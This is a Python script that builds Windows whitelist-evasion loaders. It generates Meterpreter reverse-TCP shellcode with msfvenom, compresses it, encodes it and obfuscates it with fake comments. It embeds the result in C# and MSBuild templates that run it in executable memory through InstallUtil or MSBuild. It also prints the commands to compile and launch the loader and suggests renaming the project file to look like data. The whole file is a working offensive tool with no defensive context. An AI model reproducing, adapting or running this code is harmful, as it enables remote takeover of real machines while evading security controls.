import string
import random
import os
import sys
import subprocess
import argparse
import base64
import zlib

infile=""
outfile=""
enaobf=True

# Framework basepath
basepath="C:\\Windows\\Microsoft.NET\\Framework\\"

# Used to build reference paths
frameworkversions={ "1.0":"v1.0.3705",
                    "1.1":"v1.1.4322",
                    "2.0":"v2.0.50727",
                    "3.0":"v3.0",
                    "3.5":"v3.5",
                    "4.0":"v4.0.30319"}


fakecs=[
"var=(int)test;",
"Console.Write(\"This program...\");",
"using System.Threading;",
"public class Directx;",
"private static temporary;",
"return (data);",
"while(true);",
"int i;",
"char a;",
"string mine"]
					
					
# Template for MSBuild
######################
MSBUILD='''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
	<Target Name="Installer">
		<AsmInstall />
	</Target>
	<UsingTask TaskName="AsmInstall" TaskFactory="CodeTaskFactory" AssemblyFile="__FWPATH__\Microsoft.Build.Tasks.v4.0.dll" >
		<ParameterGroup/>
		<Task>
			<Using Namespace="System" />
			<Using Namespace="System.Reflection" />
			<Code Type="Class" Language="cs">
				<![CDATA[
				using System;					
				using System.IO;
				using Microsoft.Build.Framework;
				using Microsoft.Build.Utilities;
				using System.IO.Compression;
				using System.Runtime.InteropServices;
				using System.Threading;
				
				public class AsmInstall :  Task, ITask
				{
					public override bool Execute()
					{
						IntPtr processHandle = IntPtr.Zero;
						Console.WriteLine("Started...");
						__PAYLOAD__
						byte[] final=Decompress(Convert.FromBase64String(mydata));
						processHandle = exec(final);
						WaitForSingleObject(processHandle, 0xFFFFFFFF);
						return true;
					}					
					static byte[] Decompress(byte[] data)
					{
						byte[] buffer = new byte[32768];
		                int read;
		                using (MemoryStream compressedStream = new MemoryStream(data))
							using (GZipStream zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
								using (MemoryStream resultStream = new MemoryStream())
											{
					                            while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0) resultStream.Write (buffer, 0, read);
												return resultStream.ToArray();
											}
					}					
					private static IntPtr exec(byte[] final)
					{
						__XTYPE__ funcAddr = VirtualAlloc(0, (__XTYPE__)final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						Marshal.Copy(final, 0, (IntPtr)(funcAddr), final.Length);
						IntPtr hThread = IntPtr.Zero;
						__XTYPE__ threadId = 0;
						IntPtr pinfo = IntPtr.Zero;
						hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
						return hThread;
					}
					private static __XTYPE__ MEM_COMMIT = 0x1000;
					private static __XTYPE__ PAGE_EXECUTE_READWRITE = 0x40;
					[DllImport("kernel32")]
					private static extern __XTYPE__ VirtualAlloc(__XTYPE__ lpStartAddr,
					 __XTYPE__ size, __XTYPE__ flAllocationType, __XTYPE__ flProtect);
					[DllImport("kernel32")]
					private static extern IntPtr CreateThread(
						__XTYPE__ lpThreadAttributes,
						__XTYPE__ dwStackSize,
						__XTYPE__ lpStartAddress,
						IntPtr param,
						__XTYPE__ dwCreationFlags,
						ref __XTYPE__ lpThreadId
					);
					[DllImport("kernel32")]
					private static extern __XTYPE__ WaitForSingleObject(
						IntPtr hHandle,
						__XTYPE__ dwMilliseconds
					);
				}				
				]]>
			</Code>
		</Task>
	</UsingTask>
</Project>'''					
					
					
# Template for InstallUtil					
##########################
INSTALLUTIL='''using System;
using System.IO;
using System.IO.Compression;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;	
namespace Exec
{
	public class Program
	{	
		public static void Main()
		{
			Console.WriteLine("Installer");
		}
	}	
	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		private static __XTYPE__ MEM_COMMIT = 0x1000;
		private static __XTYPE__ PAGE_EXECUTE_READWRITE = 0x40;
					static byte[] Decompress(byte[] data)
					{
						byte[] buffer = new byte[32768];
		                int read;
		                using (MemoryStream compressedStream = new MemoryStream(data))
							using (GZipStream zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
								using (MemoryStream resultStream = new MemoryStream())
											{
					                            while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0) resultStream.Write (buffer, 0, read);
												return resultStream.ToArray();
											}
					}
		private static IntPtr exec(byte[] final)
					{
						__XTYPE__ funcAddr = VirtualAlloc(0, (__XTYPE__)final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						Marshal.Copy(final, 0, (IntPtr)(funcAddr), final.Length);
						IntPtr hThread = IntPtr.Zero;
						__XTYPE__ threadId = 0;
						IntPtr pinfo = IntPtr.Zero;
						hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
						return hThread;
		}	
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			IntPtr processHandle = IntPtr.Zero;	
			Console.WriteLine("Started...");
			__PAYLOAD__						
			processHandle = exec(Decompress(Convert.FromBase64String(mydata)));
			WaitForSingleObject(processHandle, 0xFFFFFFFF);	
		}	
		[DllImport("kernel32")]
		private static extern __XTYPE__ VirtualAlloc(__XTYPE__ lpStartAddr, __XTYPE__ size, __XTYPE__ flAllocationType, __XTYPE__ flProtect);	
		[DllImport("kernel32")]
		private static extern bool VirtualFree(IntPtr lpAddress, __XTYPE__ dwSize, __XTYPE__ dwFreeType);
		[DllImport("kernel32")]
		private static extern IntPtr CreateThread( __XTYPE__ lpThreadAttributes, __XTYPE__ dwStackSize, __XTYPE__ lpStartAddress, IntPtr param, __XTYPE__ dwCreationFlags, ref __XTYPE__ lpThreadId );	
		[DllImport("kernel32")]
		private static extern bool CloseHandle(IntPtr handle);
		[DllImport("kernel32")]
		private static extern __XTYPE__ WaitForSingleObject( IntPtr hHandle, __XTYPE__ dwMilliseconds );
		[DllImport("kernel32")]private static extern IntPtr GetModuleHandle( string moduleName );
		[DllImport("kernel32")]
		private static extern __XTYPE__ GetProcAddress( IntPtr hModule, string procName );
		[DllImport("kernel32")]
		private static extern __XTYPE__ LoadLibrary( string lpFileName );	
		[DllImport("kernel32")]
		private static extern __XTYPE__ GetLastError();	
		[StructLayout(LayoutKind.Sequential)]
		internal struct PROCESSOR_INFO
		{
			public __XTYPE__ dwMax;
			public __XTYPE__ id0;
			public __XTYPE__ id1;
			public __XTYPE__ id2;
			public __XTYPE__ dwStandard;
			public __XTYPE__ dwFeature;	
			public __XTYPE__ dwExt;
		}	
		}
}'''

# put shell code in a string and break assignments in chunks
############################################################
def toCString(data,spln=10):
	global fakecs
	faken=len(fakecs)-1
	tabs=6
	chunks=[data[i:i+spln] for i in range(0, len(data), spln)]
	first=True
	for chunk in chunks:
		if (first):
			st=("String mydata=\"%s\";\n"%chunk)
			first=False
		else:
			st+=("\t"*tabs)+("mydata+=\"%s\";\n"%chunk)
		if (random.randint(0,1)!=0):
			st+=("\t"*tabs)+"//"+fakecs[random.randint(0,faken)]+"\n"
	return(st)

	
# Add inline and endline comments to cs code
############################################	
def obfuscatecs(code):
	global enaobf
	global fakecs
	faken=len(fakecs)-1
	text=""
	for c in code:
		if (random.randint(0,1)!=0 and enaobf):
			if (c==' '):
				text+=" /*"+fakecs[random.randint(0,faken)]+"*/ "
			else:
				if (c=='\n'):
					text+="//"+fakecs[random.randint(0,faken)]+"\n"
				else:
					text+=c
		else:
			text+=c
	return(text)

	
# installUtil method
# Tested on v2 and v4
# - x86/x64 supported
# - basic obfuscation of c# code
# - basic obfuscation of shellcode
# TODO:
# - Better code obuscation of c# code
# - Client based shellcode encoding (hostanme/IP?)
def installUtil(fwpath,payload,x64=False):
	global infile
	global outfile
	text=obfuscatecs(INSTALLUTIL)
	if x64:
		text=text.replace("__XTYPE__","ulong")
	else:
		text=text.replace("__XTYPE__","UInt32")
	text=text.replace("__PAYLOAD__",payload)	
	if (not ".cs" in infile):
		infile = infile+".cs"	
	if (not ".exe" in outfile):	
		outfile = outfile+".exe"
	print "Compile command line:"
	if x64:
		fwpath=fwpath.replace("Framework","Framework64")
	print fwpath+"\\csc.exe /out:"+outfile+" "+infile
	print "Command line:"
	print fwpath+"\\InstallUtil.exe /logfile= /LogToConsole=false /U "+outfile
	return(text)


# msbuild method
# Only for v4 (inline tasks needed)
# - x86/x64 supported
# - basic obfuscation of c# code
# - basic obfuscation of shellcode
# TODO:
# - Better code obuscation of c# code
# - Client based shellcode encoding (hostanme/IP?)
def msbuild(fwpath,payload,x64=False):
	global infile
	x=MSBUILD.split("<![CDATA[\n")
	head=x[0]+"<![CDATA[\n"
	x=x[1].split("]]>\n")
	tail="]]>\n"+x[1]	
	text=head+obfuscatecs(x[0])+tail
	if x64:
		text=text.replace("__XTYPE__","ulong")
	else:
		text=text.replace("__XTYPE__","UInt32")
	text=text.replace("__PAYLOAD__",payload)
	text=text.replace("__FWPATH__",fwpath)
	if (not ".csproj" in infile):
		infile = infile+".csproj"
	print "Command line:"
	if x64:
		print fwpath.replace("Framework","Framework64")+"\\msbuild.exe "+infile
	else:
		print fwpath+"\\msbuild.exe "+infile
	print "Remember you can freely rename the file (i.e. data.txt)"
	return(text)
	

# Available methods
methods={ 	"msbuild": msbuild,
			"installUtil": installUtil}	

			
# MAIN
######


#commandline args
parser = argparse.ArgumentParser(description='Generates an exe that can take advantage of the InstallUtil whitelist evasion technique.')
parser.add_argument('--cs_file', dest='inp_name', action='store', default='script')
parser.add_argument('--exe_file', dest='outp_name', action='store', default='script')
parser.add_argument('--framework', dest='fwv', action='store', default='2.0')	
parser.add_argument('--payload', dest='payload', action='store', default='windows/meterpreter/reverse_tcp')
parser.add_argument('--lhost', dest='lhost', action='store', default='192.168.0.1')
parser.add_argument('--lport', dest='lport', action='store', default='4444')
parser.add_argument('--method', dest='method', action='store', default='installUtil')
args=parser.parse_args()

# Set file names
infile=args.inp_name
outfile=args.outp_name

if args.fwv not in frameworkversions:
	print("Please select a correct framework version (1.0, 1.1, 2.0, 3.0 or 4.0)")     # Valutare estensione
	sys.exit()
    
if args.method not in methods:
	print("Please select a correct method (msbuild, installUtil)")     # Valutare estensione
	sys.exit()	

if (not "windows" in args.payload):
	print "Please choose a windows payload"
	sys.exit()
	
if ("x64" in args.payload):
	x64=True
else:
	x64=False

# Details	
print "Framework: "+args.fwv
print "Connection info: "+args.lhost+":"+args.lport+" ("+args.payload+")"	
	
# msfvenom generated payload.  Future revisions may support different payload generation techniques
print "Generating shellcode using msfvenom..."
payload = subprocess.check_output(["msfvenom","-p",args.payload,"-f","raw","LHOST="+args.lhost,"LPORT="+args.lport])

# Obfuscate payload (zlib+base64)
gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
gzip_data = gzip_compress.compress(payload) + gzip_compress.flush()
payload = toCString(base64.b64encode(gzip_data))
print "Obfuscated payload size: %d"%(len(payload))

# Set framework path
fwpath=basepath+frameworkversions[args.fwv]

# Get exploit code
code=methods[args.method](fwpath,payload,x64)

# Save file
print "Saving code..."
f = open(infile, "w")
f.write(code)
f.close()
